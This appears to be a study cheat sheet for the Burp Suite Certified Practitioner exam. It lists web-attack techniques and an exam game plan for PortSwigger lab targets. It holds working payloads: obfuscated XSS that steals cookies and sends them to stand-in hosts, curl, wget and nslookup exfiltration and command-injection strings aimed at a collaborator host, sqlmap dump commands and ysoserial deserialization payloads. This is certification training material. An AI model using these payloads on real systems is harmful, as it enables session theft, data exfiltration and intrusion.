# Resources
- [botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md)
- [DingyShark/BurpSuiteCertifiedPractitioner](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file)
- [micahvandeusen - burp-suite-certified-practitioner-exam-review](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/)
# Payload processing
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
# Web Cache
```http
Host: TARGET.net
Host: exploit.net
```
```http
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Scheme: nohttps
X-Forwarded-Proto: EXPLOIT.net
Origin: EXPLOIT.net
```
```http
GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>
```
# Host Header
- Check if the Host header is validated
```http
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
```
# Brute Force
- Cluster bomb
- Long password, right/wrong user
- Subtle response message difference
- Return of a 302
- Protected Login > X-Forwarded-For: 12.13.14.15
# Password Reset
- Refresh password (Stage 1)
- Current password - escalate privileges (Stage 2)
# API and Access Control
- Mass Assignment
- Parameter pollution (url encode special symbols)
- Original URL to admin panel
```http
X-Original-URL: /admin
```
- TRACE method to admin panel to disclose special headers
- Look for Server side prototype pollution
# CORS
- Set Origin header to arbitrary header or null
- Check for anti iframe headers
- Look for Access-Control-Allow-Credentials
- Look for Access-Control-Allow-Origin
# XSS
```html
"-(window["document"]["location"]="https://exploit-server%2eweb-security-academy%2enet/?"+window["document"]["cookie"])-"
"}; window['docu'+'ment']['loc'+'ation']='https://subdomain%2eexploit-server%2enet/?'+(window['docu'+'ment']['coo'+'kie']);//
<script>
location ='https://url.web-security-academy.net/?SearchTerm=%22-%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2Fexploit%252eexploit-server%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29-%22';
</script>
fetch("https://url.net/?c="+btoa(document.cookie))
"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>
fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])
"-eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
If eval is blocked used other alternatives
<><img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)>
document.location='https://OASTIFY.COM/?cookies='+document.cookie;
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```
- Check: https://github.com/DingyShark/BurpSuiteCertifiedPractitioner/?tab=readme-ov-file#some-useful-bypasses
# SQLi
```bash
sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter"
sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3
sqlmap -u "url" --cookie="cookies" --batch -D database -T table --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3 --dump
```

# Insecure Deserialization
- Command
```bash
java -jar ysoserial-all.jar [payload] "command"
```
- Base64 encode the payload piping the output to `base64 -w 0`
   - For MacOS use the `gbase64` command which accepts the -w flag

```bash
java -jar ysoserial-all.jar [payload] "command" | gzip -c | base64 -w 0
```
# Command for data exfiltration
```bash
curl --data @/home/carlos/secret subdomain.collaborator.net
wget --post-file /home/carlos/secret subdomain.collaborator.net
&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`
||nslookup+$(cat+/home/carlos/secret).<collaborator>
`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`
```
# Game plan
## Quick recon
- Quickly glance at both apps and run "scan selected insertion point" on interesting url parameters
- While the preliminary scans run focus on one web app
- Only switch to the other web app if the scans return a positive result
- Map out all functionalities
- Run a content discovery scan
   - Another option is to instead used ffuf or gobuster
   ```bash
   wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt
   ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ
   ffuf -u http://kek.com/FUZZ -w /usr/share/dirb/wordlists/big.txt -t 50 -c
   gobuster dir -u http://kek.com -w /usr/share/dirb/wordlists/common.txt
   ```
- Use Burp's browser to look for DOM XSS, Web messages, or Prototype pollution
- Use Param Miner to Probe for different vulnerabilities
    - Web Cache Poisoning
    - Host header injection
- From the "Site map" tab use the "Engagement tools" to gather information
- Follow the information disclosure methodology to find information
- Use the Developer tools to look for event listeners
- Use the HTTP Request Smuggling Probe
- Try Brute Force Issues
- If stage 1 involved user interaction then don't use CSRF or CORS as there is only one active user
- If stage 1 did not involve user interaction then try CSRF or CORS
- Look for password reset issues
## Found a suitable functionality to exploit
- Step through each possible scenario and study how the endpoint behaves under different conditions
- Remember, the payload might work, but it needs to be obfuscated
## Escalated privileges
- Determine what new functionality/privileges the user has gained
- Remember, the payload might work, but it needs to be obfuscated
